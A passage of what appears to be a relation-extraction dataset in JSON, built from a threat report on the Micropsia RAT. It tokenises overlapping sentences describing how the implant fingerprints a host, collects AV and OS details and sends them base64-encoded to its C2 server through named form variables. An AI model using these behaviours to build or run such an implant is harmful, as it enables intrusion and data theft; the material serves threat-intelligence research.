{"r": "WR", "evidence": [2, 3, 4], "h": 5, "t": 13}, {"r": "RD", "evidence": [2, 3, 4], "h": 5, "t": 15}, {"r": "WR", "evidence": [2, 3, 4], "h": 5, "t": 14}, {"r": "WR", "evidence": [2, 3, 4], "h": 5, "t": 15}, {"r": "WR", "evidence": [2, 3, 4], "h": 5, "t": 16}, {"r": "RF", "evidence": [2, 3, 4], "h": 5, "t": 17}, {"r": "RD", "evidence": [2, 3, 4, 5, 6], "h": 5, "t": 19}, {"r": "RD", "evidence": [2, 3, 4, 5, 6, 7], "h": 5, "t": 20}, {"r": "CO", "evidence": [2, 3, 4], "h": 9, "t": 17}, {"r": "CO", "evidence": [2], "t": 7, "h": 9}, {"r": "CO", "evidence": [4, 5], "h": 16, "t": 18}]}, {"title": "628-9", "sents": [["Information", "GatheringThe", "remaining", "two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."], ["The", "sequence", "of", "actions", "followed", "for", "gathering", "system", "information", "from", "the", "endpoint", "are", "as", "follows", ":", "Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."], ["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "Gather", "the", "Computername", "and", "username", "from", "ENV", "."], ["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost", "oot\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."], ["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."], ["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."], ["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."], ["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":", "vcqmxylcv=", "base64", "encoded", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "vcnwaapcv=", "base64", "encoded", "AV", "Name", "list.vcllgracv=", "base64", "encoded", "OS", "version", "string.vcwjlxycv=", "base64", "encoded", "implant", "command", "line.vccodwfcv=", "base64", "encoded", "hardcoded", "flag", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "timers", "pos": [4, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "information", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "RAT capabilities", "pos": [13, 15], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [22, 22], "name": "actions", "pos": [3, 4], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [26, 26], "name": "system information", "pos": [7, 9], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [30, 30], "name": "endpoint", "pos": [11, 12], "index": "5_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [37, 37], "name": "pc ID", "pos": [18, 20], "index": "6_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [42, 42], "name": "endpoint", "pos": [23, 24], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "data file", "pos": [5, 7], "index": "8_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [63, 63], "name": "Computername", "pos": [19, 20], "index": "9_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [65, 65], "name": "username", "pos": [21, 22], "index": "10_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [71, 71], "name": "computername", "pos": [2, 3], "index": "11_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [73, 73], "name": "username", "pos": [4, 5], "index": "12_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [75, 75], "name": "pcid", "pos": [6, 7], "index": "13_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [92, 92], "name": "AV information", "pos": [23, 25], "index": "14_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [96, 96], "name": "endpoint", "pos": [27, 28], "index": "15_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [115, 115], "name": "AV information", "pos": [2, 4], "index": "16_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [124, 124], "name": "OS information", "pos": [1, 3], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [137, 137], "name": "command line", "pos": [5, 7], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [145, 145], "name": "data", "pos": [2, 3], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [158, 158], "name": "query variables", "pos": [15, 17], "index": "20_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "RF", "evidence": [1], "h": 3, "t": 5}, {"r": "RD", "evidence": [1], "h": 3, "t": 6}, {"r": "RD", "evidence": [1], "h": 3, "t": 6}, {"r": "WR", "evidence": [1], "h": 3, "t": 6}, {"r": "RD", "evidence": [1], "t": 6, "h": 7}, {"r": "WR", "evidence": [1], "t": 6, "h": 7}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 8}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 9}, {"r": "RD", "evidence": [1, 2, 3], "h": 3, "t": 11}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 10}, {"r": "RD", "evidence": [1, 2, 3], "h": 3, "t": 12}, {"r": "WR", "evidence": [1, 2, 3], "h": 3, "t": 11}, {"r": "RD", "evidence": [1, 2, 3], "h": 3, "t": 13}, {"r": "WR", "evidence": [1, 2, 3], "h": 3, "t": 12}, {"r": "WR", "evidence": [1, 2, 3], "h": 3, "t": 13}, {"r": "WR", "evidence": [1, 2, 3], "h": 3, "t": 14}, {"r": "RF", "evidence": [1, 2, 3], "h": 3, "t": 15}, {"r": "RD", "evidence": [1, 2, 3, 4, 5], "h": 3, "t": 17}, {"r": "RD", "evidence": [1, 2, 3, 4, 5, 6], "h": 3, "t": 18}, {"r": "RD", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 3, "t": 19}, {"r": "WR", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 3, "t": 20}, {"r": "CO", "evidence": [1, 2, 3], "h": 7, "t": 15}, {"r": "CO", "evidence": [1], "t": 5, "h": 7}, {"r": "CO", "evidence": [3, 4], "h": 14, "t": 16}]}, {"title": "628-10", "sents": [["The", "sequence", "of", "actions", "followed", "for", "gathering", "system", "information", "from", "the", "endpoint", "are", "as", "follows", ":", "Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."], ["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "Gather", "the", "Computername", "and", "username", "from", "ENV", "."], ["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost", "oot\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."], ["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."], ["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."], ["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."], ["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":", "vcqmxylcv=", "base64", "encoded", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "vcnwaapcv=", "base64", "encoded", "AV", "Name", "list.vcllgracv=", "base64", "encoded", "OS", "version", "string.vcwjlxycv=", "base64", "encoded", "implant", "command", "line.vccodwfcv=", "base64", "encoded", "hardcoded", "flag", "."], ["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "actions", "pos": [3, 4], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [7, 7], "name": "system information", "pos": [7, 9], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [11, 11], "name": "endpoint", "pos": [11, 12], "index": "2_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [18, 18], "name": "pc ID", "pos": [18, 20], "index": "3_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [23, 23], "name": "endpoint", "pos": [23, 24], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "data file", "pos": [5, 7], "index": "5_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [44, 44], "name": "Computername", "pos": [19, 20], "index": "6_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [46, 46], "name": "username", "pos": [21, 22], "index": "7_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [52, 52], "name": "computername", "pos": [2, 3], "index": "8_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [54, 54], "name": "username", "pos": [4, 5], "index": "9_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [56, 56], "name": "pcid", "pos": [6, 7], "index": "10_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [73, 73], "name": "AV information", "pos": [23, 25], "index": "11_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [77, 77], "name": "endpoint", "pos": [27, 28], "index": "12_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [96, 96], "name": "AV information", "pos": [2, 4], "index": "13_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [105, 105], "name": "OS information", "pos": [1, 3], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [118, 118], "name": "command line", "pos": [5, 7], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [126, 126], "name": "data", "pos": [2, 3], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [139, 139], "name": "query variables", "pos": [15, 17], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [183, 183], "name": "data", "pos": [1, 2], "index": "18_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [191, 191], "name": "C2 server", "pos": [9, 11], "index": "19_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "h": 0, "t": 3}, {"r": "RD", "evidence": [0], "h": 0, "t": 3}, {"r": "WR", "evidence": [0], "h": 0, "t": 3}, {"r": "RD", "evidence": [0], "t": 3, "h": 4}, {"r": "WR", "evidence": [0], "t": 3, "h": 4}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 5}, {"r": "RD", "evidence": [0, 1], "h": 0, "t": 6}, {"r": "RD", "evidence": [0, 1, 2], "h": 0, "t": 8}, {"r": "RD", "evidence": [0, 1], "h": 0, "t": 7}, {"r": "RD", "evidence": [0, 1, 2], "h": 0, "t": 9}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 8}, {"r": "RD", "evidence": [0, 1, 2], "h": 0, "t": 10}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 9}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 10}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 11}, {"r": "RF", "evidence": [0, 1, 2], "h": 0, "t": 12}, {"r": "RD", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 14}, {"r": "RD", "evidence": [0, 1, 2, 3, 4, 5], "h": 0, "t": 15}, {"r": "RD", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 0, "t": 16}, {"r": "WR", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 0, "t": 17}, {"r": "WR", "evidence": [0, 1, 2, 3, 4, 5, 6, 7], "h": 0, "t": 18}, {"r": "ST", "evidence": [0, 1, 2, 3, 4, 5, 6, 7], "h": 0, "t": 19}, {"r": "CO", "evidence": [0, 1, 2], "h": 4, "t": 12}, {"r": "CO", "evidence": [0], "t": 2, "h": 4}, {"r": "CO", "evidence": [2, 3], "h": 11, "t": 13}]}, {"title": "628-11", "sents": [["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "Gather", "the", "Computername", "and", "username", "from", "ENV", "."], ["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost", "oot\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."], ["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."], ["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."], ["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."], ["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":", "vcqmxylcv=", "base64", "encoded", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "vcnwaapcv=", "base64", "encoded", "AV", "Name", "list.vcllgracv=", "base64", "encoded", "OS", "version", "string.vcwjlxycv=", "base64", "encoded", "implant", "command", "line.vccodwfcv=", "base64", "encoded", "hardcoded", "flag", "."], ["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."], ["RAT", "capabilitiesOnce", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "data file", "pos": [5, 7], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [19, 19], "name": "Computername", "pos": [19, 20], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [21, 21], "name": "username", "pos": [21, 22], "index": "2_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [27, 27], "name": "computername", "pos": [2, 3], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [29, 29], "name": "username", "pos": [4, 5], "index": "4_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [31, 31], "name": "pcid", "pos": [6, 7], "index": "5_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [48, 48], "name": "AV information", "pos": [23, 25], "index": "6_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [52, 52], "name": "endpoint", "pos": [27, 28], "index": "7_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [71, 71], "name": "AV information", "pos": [2, 4], "index": "8_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [80, 80], "name": "OS information", "pos": [1, 3], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [93, 93], "name": "command line", "pos": [5, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [101, 101], "name": "data", "pos": [2, 3], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [114, 114], "name": "query variables", "pos": [15, 17], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [158, 158], "name": "data", "pos": [1, 2], "index": "13_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [166, 166], "name": "C2 server", "pos": [9, 11], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [192, 192], "name": "implant", "pos": [10, 11], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [197, 197], "name": "access trojan", "pos": [15, 17], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [206, 206], "name": "command codes", "pos": [24, 26], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [210, 210], "name": "C2 server", "pos": [28, 30], "index": "18_0"}]], "labels": [{"r": "CO", "evidence": [1, 2], "h": 6, "t": 8}, {"r": "FR", "evidence": [7], "h": 15, "t": 16}, {"r": "RD", "evidence": [7], "h": 15, "t": 17}, {"r": "RF", "evidence": [7], "h": 15, "t": 18}]}, {"title": "628-12", "sents": [["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost", "oot\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."], ["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."], ["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."], ["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."], ["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":", "vcqmxylcv=", "base64", "encoded", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "vcnwaapcv=", "base64", "encoded", "AV", "Name", "list.vcllgracv=", "base64", "encoded", "OS", "version", "string.vcwjlxycv=", "base64", "encoded", "implant", "command", "line.vccodwfcv=", "base64", "encoded", "hardcoded", "flag", "."], ["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."], ["RAT", "capabilitiesOnce", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."], ["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":", "vcgqjdlrcv", "=", "hardcoded", "value", "0.", "mugnaq", "=", "base64", "encoded", "screenshot", "or", "command", "output", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [2, 2], "name": "computername", "pos": [2, 3], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [4, 4], "name": "username", "pos": [4, 5], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [6, 6], "name": "pcid", "pos": [6, 7], "index": "2_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [23, 23], "name": "AV information", "pos": [23, 25], "index": "3_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [27, 27], "name": "endpoint", "pos": [27, 28], "index": "4_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [46, 46], "name": "AV information", "pos": [2, 4], "index": "5_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [55, 55], "name": "OS information", "pos": [1, 3], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [68, 68], "name": "command line", "pos": [5, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [76, 76], "name": "data", "pos": [2, 3], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [89, 89], "name": "query variables", "pos": [15, 17], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [133, 133], "name": "data", "pos": [1, 2], "index": "10_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [141, 141], "name": "C2 server", "pos": [9, 11], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [167, 167], "name": "implant", "pos": [10, 11], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [172, 172], "name": "access trojan", "pos": [15, 17], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [181, 181], "name": "command codes", "pos": [24, 26], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [185, 185], "name": "C2 server", "pos": [28, 30], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [189, 189], "name": "implant", "pos": [1, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [203, 203], "name": "commands executed", "pos": [15, 17], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [207, 207], "name": "endpoint", "pos": [19, 20], "index": "18_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 3, "t": 5}, {"r": "FR", "evidence": [6], "h": 12, "t": 13}, {"r": "RD", "evidence": [6], "h": 12, "t": 14}, {"r": "RF", "evidence": [6], "h": 12, "t": 15}, {"r": "EX", "evidence": [7], "h": 16, "t": 17}, {"r": "RF", "evidence": [7], "h": 16, "t": 18}]}, {"title": "628-13", "sents": [["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."], ["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."], ["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."], ["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":", "vcqmxylcv=", "base64", "encoded", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "vcnwaapcv=", "base64", "encoded", "AV", "Name", "list.vcllgracv=", "base64", "encoded", "OS", "version", "string.vcwjlxycv=", "base64", "encoded", "implant", "command", "line.vccodwfcv=", "base64", "encoded", "hardcoded", "flag", "."], ["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."], ["RAT", "capabilitiesOnce", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."], ["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":", "vcgqjdlrcv", "=", "hardcoded", "value", "0.", "mugnaq", "=", "base64", "encoded", "screenshot", "or", "command", "output", "."], ["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [2, 2], "name": "AV information", "pos": [2, 4], "index": "0_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [11, 11], "name": "OS information", "pos": [1, 3], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [24, 24], "name": "command line", "pos": [5, 7], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [32, 32], "name": "data", "pos": [2, 3], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [45, 45], "name": "query variables", "pos": [15, 17], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [89, 89], "name": "data", "pos": [1, 2], "index": "5_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [97, 97], "name": "C2 server", "pos": [9, 11], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [123, 123], "name": "implant", "pos": [10, 11], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [128, 128], "name": "access trojan", "pos": [15, 17], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [137, 137], "name": "command codes", "pos": [24, 26], "index": "9_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [141, 141], "name": "C2 server", "pos": [28, 30], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [145, 145], "name": "implant", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [159, 159], "name": "commands executed", "pos": [15, 17], "index": "12_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [163, 163], "name": "endpoint", "pos": [19, 20], "index": "13_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [180, 180], "name": "C2", "pos": [1, 2], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [183, 183], "name": "command codes", "pos": [4, 6], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [196, 196], "name": "endpoint", "pos": [17, 18], "index": "16_0"}]], "labels": [{"r": "FR", "evidence": [5], "h": 7, "t": 8}, {"r": "RD", "evidence": [5], "h": 7, "t": 9}, {"r": "RF", "evidence": [5], "h": 7, "t": 10}, {"r": "EX", "evidence": [6], "h": 11, "t": 12}, {"r": "RF", "evidence": [6], "h": 11, "t": 13}, {"r": "ST", "evidence": [7], "h": 15, "t": 16}, {"r": "RF", "evidence": [7], "h": 15, "t": 16}, {"r": "CO", "evidence": [7], "h": 14, "t": 16}]}, {"title": "628-14", "sents": [["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."], ["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."], ["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":", "vcqmxylcv=", "base64", "encoded", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "vcnwaapcv=", "base64", "encoded", "AV", "Name", "list.vcllgracv=", "base64", "encoded", "OS", "version", "string.vcwjlxycv=", "base64", "encoded", "implant", "command", "line.vccodwfcv=", "base64", "encoded", "hardcoded", "flag", "."], ["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."], ["RAT", "capabilitiesOnce", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."], ["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":", "vcgqjdlrcv", "=", "hardcoded", "value", "0.", "mugnaq", "=", "base64", "encoded", "screenshot", "or", "command", "output", "."], ["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."], ["The", "command", "codes", "accepted", "by", "the", "implant", "are", "listed", "here", ":", "Command", "codeDescription", "''", "1", "''", "or", "``", "2", "''", "or", "``", "sh", "''", "Capture", "screenshots", "to", "the", "%", "TEMP", "%", "directory", "and", "exfiltrate", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [1, 1], "name": "OS information", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [14, 14], "name": "command line", "pos": [5, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [22, 22], "name": "data", "pos": [2, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [35, 35], "name": "query variables", "pos": [15, 17], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [79, 79], "name": "data", "pos": [1, 2], "index": "4_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [87, 87], "name": "C2 server", "pos": [9, 11], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [113, 113], "name": "implant", "pos": [10, 11], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [118, 118], "name": "access trojan", "pos": [15, 17], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [127, 127], "name": "command codes", "pos": [24, 26], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [131, 131], "name": "C2 server", "pos": [28, 30], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [135, 135], "name": "implant", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [149, 149], "name": "commands executed", "pos": [15, 17], "index": "11_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [153, 153], "name": "endpoint", "pos": [19, 20], "index": "12_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [170, 170], "name": "C2", "pos": [1, 2], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [173, 173], "name": "command codes", "pos": [4, 6], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [186, 186], "name": "endpoint", "pos": [17, 18], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [189, 189], "name": "command codes", "pos": [1, 3], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [194, 194], "name": "implant", "pos": [6, 7], "index": "17_0"}]], "labels": [{"r": "FR", "evidence": [4], "h": 6, "t": 7}, {"r": "RD", "evidence": [4], "h": 6, "t": 8}, {"r": "RF", "evidence": [4], "h": 6, "t": 9}, {"r": "EX", "evidence": [5], "h": 10, "t": 11}, {"r": "RF", "evidence": [5], "h": 10, "t": 12}, {"r": "CO", "evidence": [5, 6, 7], "h": 10, "t": 17}, {"r": "ST", "evidence": [6], "h": 14, "t": 15}, {"r": "RF", "evidence": [6], "h": 14, "t": 15}, {"r": "CO", "evidence": [6], "h": 13, "t": 15}, {"r": "FR", "evidence": [7], "t": 